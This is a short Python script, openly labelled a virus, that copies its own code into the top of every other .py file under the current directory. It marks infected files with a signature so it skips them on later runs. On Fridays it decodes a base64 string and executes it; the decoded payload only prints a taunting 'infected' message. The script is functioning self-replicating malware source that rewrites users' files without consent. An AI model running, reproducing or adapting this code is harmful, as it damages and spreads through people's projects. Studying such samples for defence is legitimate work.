# VIRUS SAYS HI!

import os
import base64
import datetime

VIRUS_SIGNATURE = "# ~infected_by_complex_virus~"

def get_virus_code():
    virus_code = []
    in_virus = False
    with open(__file__, 'r') as f:
        for line in f:
            if line.strip() == "# VIRUS SAYS HI!":
                in_virus = True
            if in_virus:
                virus_code.append(line)
            if line.strip() == "# VIRUS SAYS BYE!":
                break
    return virus_code

def find_python_files(path="."):
    files = []
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            if f.endswith(".py") and f != os.path.basename(__file__):
                files.append(os.path.join(dirpath, f))
    return files

def infect_files(virus_code):
    for file in find_python_files():
        with open(file, "r") as f:
            if VIRUS_SIGNATURE in f.read():
                continue
        with open(file, "r") as f:
            original = f.read()
        with open(file, "w") as f:
            f.writelines(virus_code)
            f.write("\n" + VIRUS_SIGNATURE + "\n")
            f.write(original)

def run_payload():
    if datetime.datetime.today().weekday() == 4:  # Friday
        payload = base64.b64decode("cHJpbnQoIllPVSBIQVZFIEJFRU4gSU5GRUNURUQgSEFISEFIQSEhICEiKQ==")
        exec(payload.decode())

if __name__ == "__main__":
    virus = get_virus_code()
    infect_files(virus)
    run_payload()

# VIRUS SAYS BYE!
